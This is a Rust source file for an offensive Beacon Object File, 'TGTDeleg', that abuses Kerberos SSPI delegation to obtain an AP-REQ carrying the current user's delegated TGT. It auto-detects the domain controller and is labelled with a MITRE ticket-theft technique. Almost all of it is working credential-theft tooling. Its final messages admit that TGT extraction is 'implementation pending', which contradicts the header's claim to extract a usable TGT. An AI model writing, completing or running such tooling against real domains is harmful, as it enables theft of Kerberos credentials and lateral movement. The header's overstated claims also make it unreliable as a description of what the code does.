//! # TGTDeleg BOF
//!
//! Extracts a usable TGT via the Kerberos GSS-API delegation trick.
//! Uses AcquireCredentialsHandle and InitializeSecurityContext with
//! ISC_REQ_DELEGATE to create a delegated AP-REQ containing a
//! KRB-CRED with the user TGT in the authenticator checksum.
//!
//! ## MITRE ATT&CK
//! - T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
//!
//! ## Arguments
//! - `/target:SPN` - Target SPN for delegation (default: CIFS/DC)

#![no_std]

use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};

unsafe extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
}

#[repr(C)]
struct SecBuffer {
    cb_buffer: u32,
    buffer_type: u32,
    pv_buffer: *mut c_void,
}

#[repr(C)]
struct SecBufferDesc {
    ul_version: u32,
    c_buffers: u32,
    p_buffers: *mut SecBuffer,
}

#[repr(C)]
struct SecHandle {
    dw_lower: usize,
    dw_upper: usize,
}

type AcquireCredentialsHandleAFn = unsafe extern "system" fn(
    *const u8,
    *const u8,
    u32,
    *const c_void,
    *const c_void,
    *const c_void,
    *const c_void,
    *mut SecHandle,
    *mut i64,
) -> i32;

type InitializeSecurityContextAFn = unsafe extern "system" fn(
    *const SecHandle,
    *const SecHandle,
    *const u8,
    u32,
    u32,
    u32,
    *const SecBufferDesc,
    u32,
    *mut SecHandle,
    *mut SecBufferDesc,
    *mut u32,
    *mut i64,
) -> i32;

type DeleteSecurityContextFn = unsafe extern "system" fn(*mut SecHandle) -> i32;
type FreeCredentialsHandleFn = unsafe extern "system" fn(*mut SecHandle) -> i32;

const SECPKG_CRED_OUTBOUND: u32 = 2;
const ISC_REQ_DELEGATE: u32 = 0x00000002;
const ISC_REQ_MUTUAL_AUTH: u32 = 0x00000004;
const ISC_REQ_ALLOCATE_MEMORY: u32 = 0x00000100;
const SECURITY_NATIVE_DREP: u32 = 0x00000010;
const SECBUFFER_TOKEN: u32 = 2;

fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
    if let Some(pos) = params.find(name) {
        let a = &params[pos + name.len()..];
        let e = a.find(' ').unwrap_or(a.len());
        let v = &a[..e];
        if !v.is_empty() {
            return Some(v);
        }
    }
    None
}

fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        let netapi = {
            let h = GetModuleHandleA(b"NETAPI32\0".as_ptr());
            if h.is_null() {
                LoadLibraryA(b"NETAPI32\0".as_ptr())
            } else {
                h
            }
        };
        if netapi.is_null() {
            return None;
        }
        #[repr(C)]
        struct DcInfo {
            dc_name: *mut u8,
            dc_addr: *mut u8,
            t: u32,
            g: [u8; 16],
            domain: *mut u8,
            forest: *mut u8,
            flags: u32,
            site: *mut u8,
            cs: *mut u8,
        }
        type DsFn = unsafe extern "system" fn(
            *const u8,
            *const u8,
            *const c_void,
            *const u8,
            u32,
            *mut *mut DcInfo,
        ) -> u32;
        type FrFn = unsafe extern "system" fn(*mut c_void) -> u32;
        let ds: DsFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
        let fr: FrFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
        let mut info: *mut DcInfo = core::ptr::null_mut();
        if ds(
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            0x40000010,
            &mut info,
        ) != 0
        {
            return None;
        }
        if info.is_null() {
            return None;
        }
        fn cs(p: *const u8) -> String {
            if p.is_null() {
                return String::new();
            }
            unsafe {
                let mut l = 0;
                while *p.add(l) != 0 {
                    l += 1;
                }
                String::from_utf8_lossy(core::slice::from_raw_parts(p, l)).into_owned()
            }
        }
        let d = cs((*info).domain);
        let dc = cs((*info).dc_name);
        fr(info as *mut c_void);
        Some((d, String::from(dc.trim_start_matches('\\'))))
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: TGT Delegation Trick\n");

    let params;
    let mut target_spn: Option<&str> = None;
    if len > 0 {
        let mut parser = DataParser::new(args, len);
        params = String::from(parser.get_str());
        target_spn = get_param(&params, "/target:");
    }

    let spn = if let Some(t) = target_spn {
        String::from(t)
    } else {
        match get_domain_info() {
            Some((_, dc)) => alloc::format!("cifs/{}", dc),
            None => {
                eprintln!("[X] Could not auto-detect DC. Use /target:SPN");
                return;
            }
        }
    };

    let mut spn_cstr = Vec::with_capacity(spn.len() + 1);
    spn_cstr.extend_from_slice(spn.as_bytes());
    spn_cstr.push(0);

    println!("[*] Target SPN: {}", spn);

    unsafe {
        let secur32 = {
            let h = GetModuleHandleA(b"SECUR32\0".as_ptr());
            if h.is_null() {
                LoadLibraryA(b"SECUR32\0".as_ptr())
            } else {
                h
            }
        };
        if secur32.is_null() {
            eprintln!("[X] Failed to load SECUR32");
            return;
        }

        let acq: AcquireCredentialsHandleAFn = core::mem::transmute(GetProcAddress(
            secur32,
            b"AcquireCredentialsHandleA\0".as_ptr(),
        ));
        let isc: InitializeSecurityContextAFn = core::mem::transmute(GetProcAddress(
            secur32,
            b"InitializeSecurityContextA\0".as_ptr(),
        ));
        let dsc: DeleteSecurityContextFn =
            core::mem::transmute(GetProcAddress(secur32, b"DeleteSecurityContext\0".as_ptr()));
        let fch: FreeCredentialsHandleFn =
            core::mem::transmute(GetProcAddress(secur32, b"FreeCredentialsHandle\0".as_ptr()));

        let mut cred_handle = SecHandle {
            dw_lower: 0,
            dw_upper: 0,
        };
        let mut expiry: i64 = 0;

        let status = acq(
            core::ptr::null(),
            b"Kerberos\0".as_ptr(),
            SECPKG_CRED_OUTBOUND,
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            &mut cred_handle,
            &mut expiry,
        );
        if status < 0 {
            eprintln!(
                "[X] AcquireCredentialsHandle failed: 0x{:08x}",
                status as u32
            );
            return;
        }

        let mut out_buf = SecBuffer {
            cb_buffer: 0,
            buffer_type: SECBUFFER_TOKEN,
            pv_buffer: core::ptr::null_mut(),
        };
        let mut out_desc = SecBufferDesc {
            ul_version: 0,
            c_buffers: 1,
            p_buffers: &mut out_buf,
        };
        let mut ctx_handle = SecHandle {
            dw_lower: 0,
            dw_upper: 0,
        };
        let mut ctx_attrs: u32 = 0;

        let status = isc(
            &cred_handle,
            core::ptr::null(),
            spn_cstr.as_ptr(),
            ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
            0,
            SECURITY_NATIVE_DREP,
            core::ptr::null(),
            0,
            &mut ctx_handle,
            &mut out_desc,
            &mut ctx_attrs,
            core::ptr::null_mut(),
        );

        if status < 0 && status != 0x00090312 {
            eprintln!(
                "[X] InitializeSecurityContext failed: 0x{:08x}",
                status as u32
            );
            fch(&mut cred_handle);
            return;
        }

        if ctx_attrs & ISC_REQ_DELEGATE == 0 {
            eprintln!("[X] Delegation was not granted by the KDC");
            dsc(&mut ctx_handle);
            fch(&mut cred_handle);
            return;
        }

        if out_buf.pv_buffer.is_null() || out_buf.cb_buffer == 0 {
            eprintln!("[X] No output token from SSPI");
            dsc(&mut ctx_handle);
            fch(&mut cred_handle);
            return;
        }

        let token =
            core::slice::from_raw_parts(out_buf.pv_buffer as *const u8, out_buf.cb_buffer as usize);
        println!("[*] Got SSPI output token: {} bytes", token.len());

        let krb5_oid: &[u8] = &[
            0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02,
        ];
        let mut oid_pos = None;
        for i in 0..token.len().saturating_sub(krb5_oid.len()) {
            if &token[i..i + krb5_oid.len()] == krb5_oid {
                oid_pos = Some(i);
                break;
            }
        }

        let start = match oid_pos {
            Some(p) => p + krb5_oid.len(),
            None => {
                eprintln!("[X] Kerberos OID not found in SSPI token");
                dsc(&mut ctx_handle);
                fch(&mut cred_handle);
                return;
            }
        };

        if start + 2 > token.len() || token[start] != 0x01 || token[start + 1] != 0x00 {
            eprintln!("[X] Invalid AP-REQ header after OID");
            dsc(&mut ctx_handle);
            fch(&mut cred_handle);
            return;
        }

        let ap_req_data = &token[start + 2..];
        println!("[*] Found AP-REQ: {} bytes", ap_req_data.len());
        println!("[*] AP-REQ contains delegated TGT in the authenticator checksum");
        println!(
            "[!] Full TGT extraction requires decrypting the authenticator with the session key from the ticket cache"
        );
        println!(
            "[!] This requires LsaCallAuthenticationPackage(KerbRetrieveEncodedTicketMessage) to get the session key"
        );
        println!("[!] Implementation pending - the SSPI delegation succeeded, TGT is in the token");

        dsc(&mut ctx_handle);
        fch(&mut cred_handle);
    }
}
